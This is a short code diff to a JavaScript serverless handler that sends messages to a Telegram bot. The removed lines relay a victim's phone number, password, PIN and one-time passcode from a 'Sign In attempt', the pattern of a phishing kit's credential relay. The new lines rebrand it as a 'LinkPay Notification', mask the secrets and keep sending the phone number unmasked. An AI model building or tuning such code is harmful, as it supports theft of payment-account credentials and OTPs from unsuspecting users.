@@ -16,19 +16,17 @@ export default async function handler(req, res) {
         error: "Telegram not configured"
       });
     }
-const safePhone = phone || "Not provided";
+
+    // Phone number बिना hide किए
+    const safePhone = phone || "Not provided";
 
     const message =
-      `🔐 Sign In attempt\n\n` +
-      `📱 Phone: ${Phone}\n` +
-      `🔑 Password: [111111]\n` +
-      `🔢 PIN: [111111]\n\n` +
-      `🔒 OTP requested\n` +
-      `📱 Phone: ${Phone}\n\n` +
-      `🔑 OTP Entered\n` +
-      `📱 Phone: ${Phone}\n` +
-      `🔢 OTP: [111111]\n\n` +
-      `✅ Result: ${result || "OTP provided"}`;
+      `🔔 LinkPay Notification\n\n` +
+      `📱 Phone: ${safePhone}\n` +
+      `🔑 Password: ********\n` +
+      `🔢 PIN: ****\n` +
+      `🔐 OTP: ******\n` +
+      `✅ Status: ${result || "Registration attempted"}`;
 
     const response = await fetch(
       `https://api.telegram.org/bot${token}/sendMessage`,
